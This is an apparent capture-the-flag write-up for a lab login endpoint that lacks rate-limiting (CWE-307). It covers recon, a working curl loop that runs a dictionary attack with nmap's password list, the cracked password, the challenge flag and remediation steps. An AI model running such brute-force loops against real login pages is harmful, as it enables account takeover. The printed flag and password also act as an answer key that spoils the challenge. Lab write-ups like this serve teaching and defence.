# RemoteLink_VPN - no brute-force protection (dictionary attack)

| | |
|---|---|
| **Challenge** | RemoteLink_VPN |
| **Category** | AUTH |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://auth13.chal.deti:8072 |
| **Auth weakness** | CWE-307 - improper restriction of excessive authentication attempts |
| **Account** | vpnuser (password not given) |

## Hint
> Try the door all night - no lock slows a hand that reads Dictionary well.

## Recon
- Login `/login`, fields `username` / `password`.
- No rate-limiting / lockout - unlimited attempts.
- Failure signal: wrong password → **`200`, 1026 bytes** (same page re-rendered).
- Success signal: **`302`** redirect (207 bytes) + session cookie.

## Approach
CWE-307: nothing throttles login attempts, and `vpnuser`'s password is a plain
dictionary word, so a dictionary/common-password spray lands quickly. Stop on the
first response that breaks the `200/1026` baseline (here a `302`).

Password: **`qwerty`** (found in a common-password list - nmap's
`passwords.lst` or even a short built-in top-200 covers it).

## Exploitation
```bash
# stop at the first non-baseline response
while read -r p; do
  out=$(curl -s -o /dev/null -w '%{http_code} %{size_download}' \
        --data-urlencode "username=vpnuser" --data-urlencode "password=$p" \
        http://auth13.chal.deti:8072/login)
  [ "$out" != "200 1026" ] && { echo "HIT $p ($out)"; break; }
done < /usr/share/nmap/nselib/data/passwords.lst
# -> HIT qwerty (302 207)

curl -s -c cj.txt -d 'username=vpnuser&password=qwerty' http://auth13.chal.deti:8072/login -o /dev/null
curl -s -b cj.txt http://auth13.chal.deti:8072/ | grep -o 'flag{[^}]*}'
```
(`solve.py` automates it; pass a wordlist path as arg, else it uses a built-in
common-password list.)

## Flag
```
flag{650d9441f1c397fc553456122b3dc87a}
```

## Root cause & remediation
- **Cause:** the login endpoint enforces no rate-limiting, lockout, or backoff
  (CWE-307), and the account uses a weak dictionary password - so offline-speed
  online guessing succeeds.
- **Fix:** add rate-limiting / progressive delays / account lockout, CAPTCHA or
  MFA after repeated failures, and alerting on bursts; enforce strong passwords
  and ban known-breached ones.
